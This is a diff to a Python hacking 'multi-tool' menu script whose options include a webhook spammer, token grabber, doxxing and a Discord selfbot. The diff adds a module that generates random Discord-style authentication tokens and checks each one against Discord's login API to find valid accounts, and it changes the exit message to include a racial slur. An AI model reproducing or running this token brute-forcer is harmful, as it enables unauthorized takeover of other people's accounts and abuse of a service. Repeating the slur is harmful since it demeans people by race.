@@ -27,7 +27,7 @@ try:
   def loading_screen():
       loading_message = "Loading... "
       animation_chars = ["|", "/", "-", "\\"]
-      duration = 5
+      duration = 3
       start_time = time.time()
       
       while time.time() - start_time < duration:
@@ -54,12 +54,12 @@ try:
         ╔══════════════════════════════════════════════════════════════╗
         ║ [1] Nitro Gen + Checker              [10]                    ║  
         ║ [2] Webhook Spammer                  [11]                    ║
-        ║ [3] CC Generator                     [12]                    ║
+        ║ [3] Token Gen + Checker              [12]                    ║
         ║ [4] Netflix Generator                [13]                    ║
         ║ [5] Xbox GT Generator                [14]                    ║
         ║ [6] Hacking                                                  ║
         ║ [7] Doxxing                                                  ║
-        ║ [8] Token Checker                            [00] CREDITS    ║
+        ║ [8] Discord Selfbot                          [00] CREDITS    ║
         ║ [9] Token Grabber                            [99] EXIT       ║
         ╚══════════════════════════════════════════════════════════════╝
     ''', Colors.blue_to_cyan, interval=0.005)
@@ -137,6 +137,97 @@ try:
 
       for i in range(ilosc):
           webhook.send()
+    elif choice == 3:
+      import random
+      import string
+      import pathlib
+      import requests, os, threading, sys, time, random, ctypes, webbrowser,re, hashlib,       datetime, os.path
+      import colorama
+      from colorama import Fore, init, Back, Style
+      from datetime import date
+      if platform.system == "Windows":
+        os.system("title [et-exploits token gen] Made by etxnight#1010")
+
+      def Spinner():
+        l = ['|', '/', '-', '\\']
+        for i in l+l+l:
+            sys.stdout.write('\r' + Fore.YELLOW +'Starting GEN...'+i)
+            sys.stdout.flush()
+            time.sleep(0.2)
+
+      Spinner()
+
+      banner = (Fore.LIGHTBLUE_EX+'''
+      ██╗███████╗ ██████╗  ██████╗ ███████╗███╗   ██╗
+      ██║██╔════╝██╔═══██╗██╔════╝ ██╔════╝████╗  ██║
+      ██║███████╗██║   ██║██║  ███╗█████╗  ██╔██╗ ██║
+      ██║╚════██║██║   ██║██║   ██║██╔══╝  ██║╚██╗██║
+      ██║███████║╚██████╔╝╚██████╔╝███████╗██║ ╚████║
+      ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝''')
+      if platform.system() == "Windows":
+        os.system("cls")
+      else:
+        os.system("clear")
+      count = 0
+      current_path = os.path.dirname(os.path.realpath(__file__))
+      
+      print(Fore.BLUE)
+      print(Fore.LIGHTBLUE_EX+"[1] "+Fore.BLUE+"Token Generator(super fast!)")
+      print(Fore.LIGHTBLUE_EX+"[2] "+Fore.BLUE+"Token Checker(Checks all tokens you generated)")
+      print(Fore.LIGHTBLUE_EX+"[3] "+Fore.BLUE+"Exit")
+      print(Fore.LIGHTBLUE_EX)
+      opcion = input("\nChoice: ")
+      if opcion=='1':
+        os.system("cls")
+        print(banner)
+        cantidad = input("\nAmount to generate: ")
+        while int(count)<int(cantidad):
+            Generated = "NT"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
+            f= open(current_path +"/"+str("Generated")+str("")+".txt","a")
+            f.write(Generated+"\n")
+            print(Fore.CYAN +"Token: "+ Fore.RESET + Generated)
+            count+=1
+            if int(count)==int(cantidad):
+              print("\n" + Fore.CYAN +Fore.RED +"Tokens generated successfully!")
+              print(Fore.WHITE +Fore.BLUE +"Tokens saved in Generated.txt")
+              input(Fore.BLUE +Fore.BLUE +"\nPress enter to exit")
+              os.system("cls")
+
+              print(Fore.LIGHTBLUE_EX+"Closing!")
+              print(Fore.LIGHTBLUE_EX+"Have a good day :D")
+
+              time.sleep(2)
+              sys.exit()
+              pass
+        pass
+      if opcion=='2':
+        os.system("cls")
+        print("\n" + banner + "\n")
+        with open('Generated.txt', 'r') as f:
+          for line in f:
+              time.sleep(0)
+              token = line.rstrip("\n")
+              headers = {
+                  'Authorization': f'{token}'  
+              }
+              src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
+
+              try:
+                  if src.status_code == 200:
+                      print(f'{Fore.LIGHTGREEN_EX}Valid token! >{Fore.RESET} ' + token)
+                  else:
+                      print(f'{Fore.RED}InValid token >{Fore.RESET} ' + token)
+              except Exception:
+                  print(f"{Fore.RED}Error{Fore.RESET}")
+      pass
+      if opcion=='3':
+        os.system("cls")
+      
+        print(Fore.LIGHTBLUE_EX+"Closing!")
+        print(Fore.BLUE+"Have a good day :D")
+        time.sleep(2)
+        sys.exit()
+        pass
     elif choice == 9:
       print("yet working on")
     elif choice == 99:
@@ -155,4 +246,4 @@ try:
     sys.exit()
 except KeyboardInterrupt:
   print("")
-  print("bhai :3")
+  print("bhai negr >:3")
